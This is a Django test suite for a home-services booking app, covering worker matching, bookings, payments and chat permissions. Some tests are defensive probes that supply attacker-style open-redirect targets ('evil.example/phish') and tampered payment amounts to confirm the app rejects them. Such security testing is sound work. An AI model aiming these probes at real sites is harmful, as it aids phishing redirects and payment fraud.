from datetime import date as date_type, timedelta, time as datetime_time
from decimal import Decimal
import os
import re
import tempfile
from pathlib import Path

from django.conf import settings
from django.core.cache import cache
from django.core.exceptions import ImproperlyConfigured, ValidationError as DjangoValidationError
from django.db import IntegrityError, connection
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import TestCase, Client, SimpleTestCase, TransactionTestCase, override_settings
from django.test.utils import CaptureQueriesContext
from django.urls import reverse
from django.utils import timezone
from unittest.mock import patch
from .models import CustomUser, Service, WorkerProfile, Booking, Complaint, Payment, BookingMessage, WorkerLeave, Notification, Review, ServiceRequest, ContactEnquiry
from .ai_utils import match_service_and_workers, classify_complaint_severity, build_worker_recommendations
from .views import (
    _safe_post_login_redirect,
    MANUAL_PAYMENT_ALLOWED_STATUSES,
    _stringify,
    DEFAULT_BOOKING_WINDOW_MINUTES,
    has_worker_schedule_conflict,
    is_schedulable_time,
    parse_time_range,
)
from .rate_limit import (
    clear,
    consume_ai_quota,
    contact_email_rate_key,
    contact_ip_rate_key,
    emergency_account_key,
    emergency_ip_key,
    is_rate_limited,
    lockout_seconds_remaining,
    login_key,
    register_attempt_within_window,
    register_failure,
)
# The production configuration gates (P0-B / P0-C) are evaluated while Django
# imports settings, so they are pure functions that the tests can call directly.
from lamo.settings import _DEV_SECRET_KEY, resolve_cache_config, resolve_secret_key
from lamo.settings import _mysql_driver_ssl_modes, resolve_mysql_ssl_options


def _future_date_str(days_ahead=30):
    """Dates accepted by book_service must be today-or-later; keep tests time-proof."""
    return (date_type.today() + timedelta(days=days_ahead)).isoformat()


class AIUtilsTest(TestCase):
    def setUp(self):
        self.service1 = Service.objects.create(
            name="Plumbing",
            description="Fix leaky pipes, water tanks, and taps",
            price=500.00,
            is_active=True
        )
        self.service2 = Service.objects.create(
            name="Electrical Work",
            description="Wiring, switchboard installation, and repairs",
            price=750.00,
            is_active=True
        )

        self.worker_user = CustomUser.objects.create_user(
            username="plumber_joe",
            email="joe@test.com",
            password="Password123!",
            role="WORKER"
        )
        self.worker = WorkerProfile.objects.create(
            user=self.worker_user,
            service=self.service1,
            district="Ernakulam",
            work_status="AVAILABLE",
            is_verified=True
        )

    def test_match_service_db_fallback(self):
        result = match_service_and_workers("Plumbing", district="Ernakulam")
        self.assertIsNotNone(result['service'])
        self.assertEqual(result['service'].name, "Plumbing")
        self.assertIn(self.worker, result['workers'])

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_match_service_ai(self, mock_gemini):
        mock_gemini.return_value = "Plumbing"
        result = match_service_and_workers("Water is leaking under my kitchen sink")
        self.assertIsNotNone(result['service'])
        self.assertEqual(result['service'].name, "Plumbing")

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_classify_complaint_severity_high(self, mock_gemini):
        mock_gemini.return_value = "HIGH"
        severity = classify_complaint_severity("Dangerous wiring", "Exposed live wire causing sparks")
        self.assertEqual(severity, "HIGH")

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_classify_complaint_severity_fallback(self, mock_gemini):
        mock_gemini.return_value = None
        severity = classify_complaint_severity("Late arrival", "Worker arrived 30 mins late")
        self.assertEqual(severity, "MEDIUM")

    def test_build_worker_recommendations(self):
        recommendations = build_worker_recommendations(
            self.service1,
            district="Ernakulam",
            requirement="Kitchen tap is leaking and I need someone today"
        )

        self.assertTrue(recommendations)
        self.assertIn('worker', recommendations[0])
        self.assertIn('match_score', recommendations[0])
        self.assertIn('reasons', recommendations[0])
        self.assertGreaterEqual(recommendations[0]['match_score'], 0)

    def test_build_worker_recommendations_avoids_n_plus_one_queries(self):
        self.worker.address = 'Ernakulam, Kerala'
        self.worker.latitude = 9.98
        self.worker.longitude = 76.29
        self.worker.save(update_fields=['address', 'latitude', 'longitude'])

        Booking.objects.create(
            customer=self.worker.user,
            worker=self.worker,
            service=self.service1,
            date='2026-09-01',
            time='10:00',
            location='Ernakulam',
            phone='9876543210',
            status='COMPLETED',
            description='Completed job'
        )

        with CaptureQueriesContext(connection) as ctx:
            recommendations = build_worker_recommendations(
                self.service1,
                district='Ernakulam',
                requirement='Kitchen tap is leaking today',
                customer_lat=9.98,
                customer_lng=76.29,
            )

        self.assertTrue(recommendations)
        self.assertLess(len(ctx.captured_queries), 10)

    @patch('lamoapp.ai_utils.geocode_place')
    def test_build_worker_recommendations_does_not_use_district_as_distance(self, mock_geocode):
        mock_geocode.return_value = (None, None)

        self.worker.address = 'Patharam, Kollam'
        self.worker.district = 'Kollam'
        self.worker.save(update_fields=['address', 'district'])

        recommendations = build_worker_recommendations(
            self.service1,
            district='Kollam',
            requirement='Kitchen tap is leaking and I need someone today',
            customer_place='Karunagappally',
            customer_address='Karunagappally, Kollam',
        )

        self.assertTrue(recommendations)
        self.assertNotEqual(recommendations[0]['distance_label'], 'Same district')
        self.assertEqual(recommendations[0]['distance_label'], 'Exact distance unavailable')
        self.assertEqual(recommendations[0]['distance_km'], None)

    def test_ai_recommend_workers_ajax_endpoint(self):
        self.client.login(username="plumber_joe", password="Password123!")
        response = self.client.post(
            reverse('ai_recommend_workers', args=[self.service1.id]),
            {
                'requirement': 'Kitchen tap is leaking',
                'district': 'Ernakulam',
            },
            HTTP_X_REQUESTED_WITH='XMLHttpRequest',
        )

        self.assertEqual(response.status_code, 200)
        payload = response.json()
        self.assertTrue(payload['success'])
        self.assertIn('recommendations', payload)
        self.assertGreater(len(payload['recommendations']), 0)
        self.assertEqual(payload['recommendations'][0]['district'], self.worker.district)
        self.assertIn('worker_image', payload['recommendations'][0])

    def test_service_detail_renders_the_shared_booking_modal(self):
        response = self.client.get(reverse('service_detail', args=[self.service1.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(
            response,
            'bootstrap-icons@1.11.3/font/bootstrap-icons.min.css',
        )
        self.assertEqual(
            response.content.decode().count('id="bookingModal"'),
            1,
        )
        self.assertContains(response, 'id="bookingModalForm"')
        self.assertContains(response, 'name="worker"')
        self.assertContains(response, 'name="service"')
        self.assertContains(response, 'id="modalBookingMap"')
        self.assertContains(response, 'data-tile-attribution="Tiles &amp;copy; Esri')
        self.assertNotContains(response, r'\u0026copy\u003B')


class BookingLifecycleTest(TestCase):
    def setUp(self):
        self.client = Client()
        self.customer = CustomUser.objects.create_user(
            username="customer1",
            email="cust@test.com",
            password="Password123!",
            role="USER"
        )
        self.service = Service.objects.create(
            name="Cleaning",
            description="Deep house cleaning",
            price=1200.00,
            is_active=True
        )
        self.worker_user = CustomUser.objects.create_user(
            username="cleaner_mary",
            email="mary@test.com",
            password="Password123!",
            role="WORKER"
        )
        self.worker = WorkerProfile.objects.create(
            user=self.worker_user,
            service=self.service,
            district="Ernakulam",
            work_status="AVAILABLE",
            is_verified=True
        )

    def _booking_date(self, days_ahead=30):
        return _future_date_str(days_ahead)

    def test_booking_cost_uses_service_price_not_customer_or_duration(self):
        self.worker.pricing_amount = Decimal('500.00')
        self.worker.pricing_type = 'hour'
        self.worker.save(update_fields=['pricing_amount', 'pricing_type'])
        self.client.login(username="customer1", password='Password123!')

        response = self.client.post(reverse('book_service'), {
            'worker': self.worker.id,
            'service': self.service.id,
            'booking_type': 'One Time',
            'date': self._booking_date(),
            'time': '10:00-12:00',
            'location': 'Ernakulam',
            'phone': '9876543210',
            'description': 'Two-hour booking',
            'estimated_cost': '1.00',
        })

        self.assertEqual(response.status_code, 302)
        booking = Booking.objects.get(customer=self.customer)
        self.assertEqual(booking.estimated_cost, Decimal('1200.00'))

        response = self.client.get(reverse('my_bookings'))

        self.assertContains(response, '&#8377;500.00 / hour')
        self.assertContains(response, '&#8377;1200.00')

    def test_prevent_booking_when_worker_unavailable(self):
        self.worker.work_status = "LEAVE"
        self.worker.save()

        self.client.login(username="customer1", password="Password123!")
        response = self.client.post(reverse('book_service'), {
            'worker': self.worker.id,
            'service': self.service.id,
            'booking_type': 'One Time',
            'date': self._booking_date(30),
            'time': '10:00',
            'location': 'Ernakulam',
            'phone': '9876543210',
            'description': 'Clean room'
        })
        self.assertEqual(Booking.objects.count(), 0)

    def test_prevent_double_booking_same_date(self):
        target_date = self._booking_date(31)
        Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=target_date,
            time='10:00',
            location='Ernakulam',
            phone='9876543210',
            status='ACCEPTED'
        )

        self.client.login(username="customer1", password="Password123!")
        response = self.client.post(reverse('book_service'), {
            'worker': self.worker.id,
            'service': self.service.id,
            'booking_type': 'One Time',
            'date': target_date,
            'time': '14:00',
            'location': 'Ernakulam',
            'phone': '9876543210',
            'description': 'Second booking test'
        })
        self.assertEqual(Booking.objects.count(), 1)

    def test_prevent_overlapping_time_ranges(self):
        target_date = self._booking_date(32)
        Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=target_date,
            time='10:00-12:00',
            start_time='10:00:00',
            end_time='12:00:00',
            location='Ernakulam',
            phone='9876543210',
            status='ACCEPTED'
        )

        self.client.login(username="customer1", password="Password123!")
        response = self.client.post(reverse('book_service'), {
            'worker': self.worker.id,
            'service': self.service.id,
            'booking_type': 'One Time',
            'date': target_date,
            'time': '11:00-13:00',
            'location': 'Ernakulam',
            'phone': '9876543210',
            'description': 'Overlapping time booking'
        })

        self.assertEqual(Booking.objects.filter(worker=self.worker, date=target_date).count(), 1)

    def test_cancel_booking(self):
        booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date='2026-09-02',
            time='11:00',
            location='Ernakulam',
            phone='9876543210',
            status='PENDING'
        )

        self.client.login(username="customer1", password="Password123!")
        response = self.client.post(reverse('cancel_booking', args=[booking.id]))
        booking.refresh_from_db()
        self.assertEqual(booking.status, 'CANCELLED')

    def test_cancel_booking_without_worker_succeeds(self):
        booking = Booking.objects.create(
            customer=self.customer,
            worker=None,
            service=self.service,
            date='2026-09-02',
            time='11:00',
            location='Ernakulam',
            phone='9876543210',
            status='PENDING'
        )
        self.client.login(username="customer1", password="Password123!")
        response = self.client.post(reverse('cancel_booking', args=[booking.id]))
        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertEqual(booking.status, 'CANCELLED')

    def test_cancel_emergency_pending_booking_succeeds(self):
        booking = Booking.objects.create(
            customer=self.customer,
            worker=None,
            service=self.service,
            date='2026-09-02',
            time='11:00',
            location='Ernakulam',
            phone='9876543210',
            status='EMERGENCY_PENDING',
            booking_type='Emergency'
        )
        self.client.login(username="customer1", password="Password123!")
        response = self.client.post(reverse('cancel_booking', args=[booking.id]))
        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertEqual(booking.status, 'CANCELLED')

    def test_customer_payment_report_does_not_mark_booking_paid(self):
        booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date='2026-09-03',
            time='12:00',
            location='Ernakulam',
            phone='9876543210',
            status='ACCEPTED',
            estimated_cost='1200.00'
        )

        self.client.login(username="customer1", password="Password123!")
        response = self.client.post(
            reverse('confirm_payment', args=[booking.id]),
            {'payment_method': 'UPI', 'payment_reference': 'UPI-REF-1001'}
        )

        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertFalse(booking.is_paid)
        self.assertEqual(booking.payment_method, 'UPI')
        payment = Payment.objects.get(booking=booking)
        self.assertEqual(payment.status, 'PENDING')
        self.assertIsNone(payment.paid_at)


class ManualPaymentHardeningTest(TestCase):
    def setUp(self):
        self.customer = _make_user('pay_customer')
        self.other_customer = _make_user('pay_other')
        self.service = Service.objects.create(
            name='Manual Pay Service',
            description='payment hardening probes',
            price=1000.00,
            is_active=True,
        )
        self.worker = _make_worker('pay_worker', self.service)

    def _booking(self, customer=None, status='ACCEPTED', **kwargs):
        defaults = dict(
            customer=customer or self.customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(30),
            time='12:00',
            location='Ernakulam',
            phone='9876543210',
            status=status,
            estimated_cost='1000.00',
        )
        defaults.update(kwargs)
        return Booking.objects.create(**defaults)

    def test_cancelled_booking_cannot_be_paid(self):
        booking = self._booking(status='CANCELLED')
        self.client.login(username=self.customer.username, password='Password123!')
        response = self.client.post(reverse('confirm_payment', args=[booking.id]), {
            'payment_method': 'UPI', 'payment_reference': 'CANCELLED-REF-1',
        })
        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertFalse(booking.is_paid)
        self.assertFalse(Payment.objects.filter(booking=booking).exists())

    def test_rejected_booking_cannot_be_paid(self):
        booking = self._booking(status='REJECTED')
        self.client.login(username=self.customer.username, password='Password123!')
        response = self.client.post(reverse('confirm_payment', args=[booking.id]), {
            'payment_method': 'UPI', 'payment_reference': 'REJECTED-REF-1',
        })
        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertFalse(booking.is_paid)

    def test_pending_booking_cannot_be_paid(self):
        booking = self._booking(status='PENDING')
        self.client.login(username=self.customer.username, password='Password123!')
        response = self.client.post(reverse('confirm_payment', args=[booking.id]), {
            'payment_method': 'UPI', 'payment_reference': 'PENDING-REF-1',
        })
        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertFalse(booking.is_paid)

    def test_other_customers_booking_cannot_be_paid(self):
        booking = self._booking(customer=self.other_customer)
        self.client.login(username=self.customer.username, password='Password123!')
        response = self.client.post(reverse('confirm_payment', args=[booking.id]), {
            'payment_method': 'UPI', 'payment_reference': 'OTHER-REF-1',
        })
        self.assertEqual(response.status_code, 404)
        booking.refresh_from_db()
        self.assertFalse(booking.is_paid)

    def test_amount_is_never_trusted_from_client(self):
        booking = self._booking()
        self.client.login(username=self.customer.username, password='Password123!')
        response = self.client.post(reverse('confirm_payment', args=[booking.id]), {
            'payment_method': 'UPI',
            'payment_reference': 'AMOUNT-PROBE-1',
            'amount': '1.00',
            'estimated_cost': '1.00',
        })
        self.assertEqual(response.status_code, 302)
        payment = Payment.objects.get(booking=booking)
        self.assertEqual(str(payment.amount), '1000.00')
        self.assertEqual(payment.status, 'PENDING')
        booking.refresh_from_db()
        self.assertFalse(booking.is_paid)

    def test_duplicate_payment_reference_never_500s(self):
        first = self._booking()
        second = self._booking()
        self.client.login(username=self.customer.username, password='Password123!')
        self.client.post(reverse('confirm_payment', args=[first.id]), {
            'payment_method': 'UPI', 'payment_reference': 'SHARED-REF-1',
        })
        response = self.client.post(reverse('confirm_payment', args=[second.id]), {
            'payment_method': 'UPI', 'payment_reference': 'SHARED-REF-1',
        })
        self.assertEqual(response.status_code, 302)
        second.refresh_from_db()
        self.assertFalse(second.is_paid)
        self.assertEqual(Payment.objects.get(booking=second).status, 'PENDING')
        refs = list(Payment.objects.values_list('payment_reference', flat=True))
        self.assertEqual(len(refs), len(set(refs)))

    def test_double_submit_never_500s_and_never_duplicates_payment(self):
        booking = self._booking()
        self.client.login(username=self.customer.username, password='Password123!')
        first = self.client.post(reverse('confirm_payment', args=[booking.id]), {
            'payment_method': 'UPI', 'payment_reference': 'DOUBLE-SUBMIT-1',
        })
        second = self.client.post(reverse('confirm_payment', args=[booking.id]), {
            'payment_method': 'UPI', 'payment_reference': 'DOUBLE-SUBMIT-1',
        })
        self.assertEqual(first.status_code, 302)
        self.assertEqual(second.status_code, 302)
        self.assertEqual(Payment.objects.filter(booking=booking).count(), 1)

    def test_completed_booking_payment_report_stays_pending(self):
        booking = self._booking(status='COMPLETED')
        self.client.login(username=self.customer.username, password='Password123!')

        response = self.client.post(
            reverse('confirm_payment', args=[booking.id]),
            {'payment_method': 'UPI', 'payment_reference': 'COMPLETED-REF-1'},
        )

        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertFalse(booking.is_paid)
        payment = Payment.objects.get(booking=booking)
        self.assertEqual(payment.amount, Decimal('1000.00'))
        self.assertEqual(payment.status, 'PENDING')


class MyBookingsDisplayTest(TestCase):
    def setUp(self):
        self.customer = _make_user('booking_display_customer')
        self.service = Service.objects.create(
            name='Display Service',
            description='Booking display checks',
            price=Decimal('950.00'),
            is_active=True,
        )
        self.worker = _make_worker('booking_display_worker', self.service)
        self.worker.pricing_amount = Decimal('500.00')
        self.worker.pricing_type = 'hour'
        self.worker.save(update_fields=['pricing_amount', 'pricing_type'])
        self.client.login(
            username=self.customer.username,
            password='Password123!',
        )

    def _booking(self, status, estimated_cost=None, is_paid=False):
        return Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=date_type.today() + timedelta(days=5),
            time='8:00 AM - 10:00 AM',
            start_time=datetime_time(8, 0),
            end_time=datetime_time(10, 0),
            location='Kollam',
            phone='9876543210',
            status=status,
            estimated_cost=estimated_cost,
            is_paid=is_paid,
        )

    def test_hourly_worker_rate_and_service_estimate_show_for_payable_bookings(self):
        for status in MANUAL_PAYMENT_ALLOWED_STATUSES:
            with self.subTest(status=status):
                self._booking(status=status)

        response = self.client.get(reverse('my_bookings'))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'Worker Pricing')
        self.assertContains(response, '&#8377;500.00 / hour')
        self.assertContains(response, 'Service Cost (estimate)')
        self.assertContains(response, '&#8377;950.00')
        self.assertEqual(response.content.decode().count('Record Manual Payment'), 4)

    def test_daily_worker_rate_is_shown_separately_from_service_cost(self):
        self.worker.pricing_amount = Decimal('1500.00')
        self.worker.pricing_type = 'day'
        self.worker.save(update_fields=['pricing_amount', 'pricing_type'])
        self._booking('ACCEPTED', estimated_cost=Decimal('950.00'))

        response = self.client.get(reverse('my_bookings'))

        self.assertContains(response, '&#8377;1500.00 / day')
        self.assertContains(response, '&#8377;950.00')
        self.assertContains(response, 'Payment Status')
        self.assertContains(response, 'Not submitted')

    def test_paid_amount_comes_from_payment_record(self):
        booking = self._booking('COMPLETED', estimated_cost=Decimal('1200.00'), is_paid=True)
        Payment.objects.create(
            booking=booking,
            amount=Decimal('975.00'),
            payment_method='UPI',
            payment_reference='DISPLAY-PAID-1',
            status='PAID',
            gateway='manual',
            paid_at=timezone.now(),
        )

        response = self.client.get(reverse('my_bookings'))

        self.assertContains(response, 'Amount Paid')
        self.assertContains(response, '&#8377;975.00')
        self.assertContains(response, 'Service Cost (estimate)')
        self.assertContains(response, '&#8377;1200.00')
        self.assertContains(response, 'Payment Status')
        self.assertContains(response, 'Paid')
        self.assertNotContains(response, 'Record Manual Payment')

    def test_pending_payment_report_waits_for_admin_verification(self):
        booking = self._booking('COMPLETED', estimated_cost=Decimal('1200.00'))
        Payment.objects.create(
            booking=booking,
            amount=Decimal('1200.00'),
            payment_method='UPI',
            payment_reference='DISPLAY-PENDING-1',
            status='PENDING',
            gateway='manual',
        )

        response = self.client.get(reverse('my_bookings'))

        self.assertContains(response, 'Service Cost (estimate)')
        self.assertContains(response, '&#8377;1200.00')
        self.assertContains(response, 'Payment Status')
        self.assertContains(response, 'Pending Verification')
        self.assertContains(response, 'Manual payment reported; awaiting admin verification.')
        self.assertNotContains(response, 'Record Manual Payment')

    def test_completed_booking_card_stays_visible_and_schedule_uses_consistent_time(self):
        self.service.price = None
        self.service.save(update_fields=['price'])
        self._booking('COMPLETED')

        response = self.client.get(reverse('my_bookings'))
        html = response.content.decode()
        css_path = Path(settings.BASE_DIR, 'lamoapp', 'static', 'css', 'user-my_bookings.css')
        css = css_path.read_text(encoding='utf-8')

        self.assertContains(response, 'booking-card--completed')
        self.assertContains(response, 'Schedule protected: 8:00 AM - 10:00 AM')
        self.assertNotContains(response, 'Schedule protected: 8 a.m.')
        self.assertContains(response, 'Payment is unavailable because no amount is configured')
        self.assertIn('visibility: visible;', css)
        self.assertIn('opacity: 1;', css)
        self.assertIn('filter: none;', css)


class LogoutCsrfTest(TestCase):
    def setUp(self):
        self.user = _make_user('logout_user')

    def test_logout_rejects_get(self):
        self.client.login(username='logout_user', password='Password123!')
        response = self.client.get(reverse('logout'))
        self.assertEqual(response.status_code, 405)
        self.assertIn('_auth_user_id', self.client.session)

    def test_logout_post_signs_user_out(self):
        self.client.login(username='logout_user', password='Password123!')
        response = self.client.post(reverse('logout'))
        self.assertEqual(response.status_code, 302)
        self.assertNotIn('_auth_user_id', self.client.session)

    def test_base_templates_use_post_logout_forms(self):
        for name in ('templates/base.html', 'templates/workers/worker_sidebar.html'):
            html = Path(settings.BASE_DIR, name).read_text(encoding='utf-8')
            self.assertNotIn('href="{% url \'logout\' %}"', html)
            self.assertIn('action="{% url \'logout\' %}"', html)


class SafeRedirectTest(TestCase):
    def setUp(self):
        self.user = _make_user('redirect_worker', role='WORKER')
        self.worker = WorkerProfile.objects.create(
            user=self.user,
            district='Ernakulam',
            availability='Full Time',
            work_status='AVAILABLE',
            is_verified=True,
        )

    def test_external_next_is_rejected(self):
        request = self.client.get('/').wsgi_request
        request.user = self.user
        target = _safe_post_login_redirect(request, 'https://evil.example/phish')
        self.assertEqual(target, reverse('worker_dashboard'))

    def test_protocol_relative_next_is_rejected(self):
        request = self.client.get('/').wsgi_request
        request.user = self.user
        target = _safe_post_login_redirect(request, '//evil.example/phish')
        self.assertEqual(target, reverse('worker_dashboard'))

    def test_local_next_is_accepted(self):
        request = self.client.get('/').wsgi_request
        request.user = self.user
        target = _safe_post_login_redirect(request, '/worker-dashboard/')
        self.assertEqual(target, '/worker-dashboard/')

    def test_worker_update_status_never_redirects_off_site(self):
        self.client.login(username='redirect_worker', password='Password123!')
        response = self.client.post(reverse('worker_update_status'), {
            'work_status': 'ON_DUTY',
            'next': 'https://evil.example/phish',
        })
        self.assertEqual(response.status_code, 302)
        self.assertTrue(response['Location'].endswith(reverse('worker_dashboard')))



def _make_user(username, role='USER'):
    return CustomUser.objects.create_user(
        username=username,
        email=f'{username}@test.com',
        password='Password123!',
        role=role,
    )


def _make_worker(username, service, district='Ernakulam', status='AVAILABLE'):
    user = _make_user(username, role='WORKER')
    return WorkerProfile.objects.create(
        user=user,
        service=service,
        district=district,
        work_status=status,
        is_verified=True,
    )


class AiAssistantWidgetJsTest(TestCase):
    def test_single_handle_send_and_single_send_ai_request(self):
        html = Path(settings.BASE_DIR, 'templates', 'includes', 'ai_assistant.html').read_text(encoding='utf-8')
        script = re.search(r'<script>(.*?)</script>', html, re.DOTALL).group(1)
        self.assertEqual(len(re.findall(r'\bfunction\s+handleSend\s*\(', script)), 1)
        self.assertEqual(len(re.findall(r'\bfunction\s+sendAiRequest\s*\(', script)), 1)

    def test_braces_balanced(self):
        html = Path(settings.BASE_DIR, 'templates', 'includes', 'ai_assistant.html').read_text(encoding='utf-8')
        script = re.search(r'<script>(.*?)</script>', html, re.DOTALL).group(1)
        self.assertEqual(script.count('{'), script.count('}'))

    def test_user_text_uses_safe_rendering(self):
        html = Path(settings.BASE_DIR, 'templates', 'includes', 'ai_assistant.html').read_text(encoding='utf-8')
        self.assertIn('function escapeHtml', html)
        self.assertIn('msgDiv.textContent', html)

    def test_database_values_escaped_before_markup(self):
        html = Path(settings.BASE_DIR, 'templates', 'includes', 'ai_assistant.html').read_text(encoding='utf-8')
        self.assertIn('escapeHtml(service.name)', html)
        self.assertIn('escapeHtml(w.name)', html)


class BookingMessagingTest(TestCase):
    def setUp(self):
        self.customer = CustomUser.objects.create_user(
            username='customer_chat',
            email='customerchat@test.com',
            password='Password123!',
            role='USER'
        )
        self.service = Service.objects.create(
            name='AC Repair',
            description='Air conditioner maintenance',
            price=1500.00,
            is_active=True,
        )
        self.worker_user = CustomUser.objects.create_user(
            username='worker_chat',
            email='workerchat@test.com',
            password='Password123!',
            role='WORKER'
        )
        self.worker = WorkerProfile.objects.create(
            user=self.worker_user,
            service=self.service,
            district='Ernakulam',
            work_status='AVAILABLE',
            is_verified=True,
        )
        self.booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date='2026-09-05',
            time='10:00-12:00',
            start_time='10:00:00',
            end_time='12:00:00',
            location='Ernakulam',
            phone='9876543210',
            status='ACCEPTED',
            estimated_cost='1500.00',
        )

    def test_booking_message_thread_allows_customer_and_worker_to_chat(self):
        self.client.login(username='customer_chat', password='Password123!')
        response = self.client.post(
            reverse('booking_messages', args=[self.booking.id]),
            {'message': 'Please confirm the arrival time for tomorrow.'}
        )

        self.assertEqual(response.status_code, 302)
        self.assertTrue(
            BookingMessage.objects.filter(
                booking=self.booking,
                sender=self.customer,
                message='Please confirm the arrival time for tomorrow.'
            ).exists()
        )

        self.client.logout()
        self.client.login(username='worker_chat', password='Password123!')
        response = self.client.get(reverse('booking_messages', args=[self.booking.id]))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'Please confirm the arrival time for tomorrow.')

        response = self.client.post(
            reverse('booking_messages', args=[self.booking.id]),
            {'message': 'I will arrive at 10 AM.'}
        )
        self.assertEqual(response.status_code, 302)
        self.assertTrue(
            BookingMessage.objects.filter(
                booking=self.booking,
                sender=self.worker_user,
                message='I will arrive at 10 AM.'
            ).exists()
        )

    def test_chat_is_blocked_until_booking_is_accepted(self):
        self.booking.status = 'PENDING'
        self.booking.save(update_fields=['status'])
        self.client.login(username='customer_chat', password='Password123!')

        response = self.client.get(reverse('booking_messages', args=[self.booking.id]))
        self.assertEqual(response.status_code, 403)

        response = self.client.post(
            reverse('booking_messages', args=[self.booking.id]),
            {'message': 'This must not be sent.'}
        )
        self.assertEqual(response.status_code, 403)
        self.assertFalse(BookingMessage.objects.filter(booking=self.booking).exists())

    def test_chat_remains_available_after_acceptance(self):
        self.client.login(username='customer_chat', password='Password123!')

        for status in ('ACCEPTED', 'IN_PROGRESS', 'COMPLETION_REQUESTED', 'COMPLETED'):
            with self.subTest(status=status):
                self.booking.status = status
                self.booking.save(update_fields=['status'])
                response = self.client.get(reverse('booking_messages', args=[self.booking.id]))
                self.assertEqual(response.status_code, 200)

    def test_my_bookings_shows_one_chat_action_only_after_acceptance(self):
        self.client.login(username='customer_chat', password='Password123!')

        response = self.client.get(reverse('my_bookings'))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.content.decode().count('class="booking-chat-btn"'), 1)
        self.assertContains(response, 'Open Chat')
        self.assertNotContains(response, '>Messages</a>')

        self.booking.status = 'PENDING'
        self.booking.save(update_fields=['status'])
        response = self.client.get(reverse('my_bookings'))
        self.assertEqual(response.content.decode().count('class="booking-chat-btn"'), 0)
        self.assertNotContains(response, 'Open Chat')

    def test_rejected_and_cancelled_bookings_cannot_open_chat(self):
        self.client.login(username='customer_chat', password='Password123!')

        for status in ('REJECTED', 'CANCELLED'):
            with self.subTest(status=status):
                self.booking.status = status
                self.booking.save(update_fields=['status'])
                response = self.client.get(reverse('booking_messages', args=[self.booking.id]))
                self.assertEqual(response.status_code, 403)

    def test_non_participant_cannot_access_accepted_booking_chat(self):
        outsider = CustomUser.objects.create_user(
            username='chat_outsider',
            email='chatoutsider@test.com',
            password='Password123!',
            role='USER'
        )
        self.client.force_login(outsider)

        response = self.client.get(reverse('booking_messages', args=[self.booking.id]))
        self.assertEqual(response.status_code, 403)

    def test_chat_thread_contains_only_messages_for_requested_booking(self):
        other_booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date='2026-09-06',
            time='12:00-13:00',
            start_time='12:00:00',
            end_time='13:00:00',
            location='Ernakulam',
            phone='9876543210',
            status='ACCEPTED',
        )
        BookingMessage.objects.create(
            booking=self.booking,
            sender=self.customer,
            message='Only in the first thread.',
        )
        BookingMessage.objects.create(
            booking=other_booking,
            sender=self.customer,
            message='Only in the other thread.',
        )
        self.client.force_login(self.customer)

        response = self.client.get(reverse('booking_messages', args=[self.booking.id]))

        self.assertContains(response, 'Only in the first thread.')
        self.assertNotContains(response, 'Only in the other thread.')

    def test_chat_thread_does_not_pollute_base_html_flash_messages(self):
        BookingMessage.objects.create(
            booking=self.booking,
            sender=self.customer,
            message='Test message should not become a toast.',
        )
        self.client.force_login(self.customer)
        response = self.client.get(reverse('booking_messages', args=[self.booking.id]))
        self.assertEqual(response.status_code, 200)
        # Verify that chat_messages contains the thread
        self.assertIn('chat_messages', response.context)
        # Verify that base.html toast converter does not receive the chat message as a flash alert
        content = response.content.decode()
        self.assertNotIn("message: 'Test message should not become a toast.'", content)


class WorkerDashboardChatPopupTest(TestCase):
    """The dashboard's "Recent Customer Messages" rows open an in-dashboard
    popup that fetches the existing booking_messages endpoint instead of
    navigating away to /booking/<id>/messages/."""

    def setUp(self):
        self.customer = _make_user('popup_customer')
        self.service = Service.objects.create(
            name='Popup Service', description='d', price=500.00, is_active=True
        )
        self.worker = _make_worker('popup_worker', self.service)
        self.booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(),
            time='10:00',
            location='Ernakulam',
            phone='9876543210',
            status='ACCEPTED',
            description='Chat popup regression booking',
        )
        self.client.login(
            username=self.worker.user.username, password='Password123!'
        )

    def _html(self):
        return self.client.get(reverse('worker_dashboard')).content.decode()

    def test_message_rows_are_popup_buttons_not_navigation_links(self):
        html = self._html()
        chat_url = reverse('booking_messages', args=[self.booking.id])

        self.assertIn('chat-open-btn', html)
        self.assertIn('data-chat-url="%s"' % chat_url, html)
        self.assertNotIn('<a href="%s"' % chat_url, html)

    def test_dashboard_renders_the_chat_modal_and_loads_its_script(self):
        html = self._html()

        self.assertIn('id="lamoChatBackdrop"', html)
        self.assertIn('id="lamoChatModal"', html)
        self.assertIn('id="lamoChatForm"', html)
        self.assertIn('js/worker-dashboard-chat.js', html)

    def test_popup_script_posts_to_booking_messages_and_renders_safely(self):
        source = (
            Path(settings.BASE_DIR)
            / 'lamoapp' / 'static' / 'js' / 'worker-dashboard-chat.js'
        ).read_text(encoding='utf-8')

        self.assertIn('X-CSRFToken', source)
        self.assertIn('X-Requested-With', source)
        self.assertIn('textContent', source)
        self.assertNotIn('.innerHTML = html', source)
        self.assertEqual(source.count('{'), source.count('}'))
        self.assertEqual(source.count('('), source.count(')'))

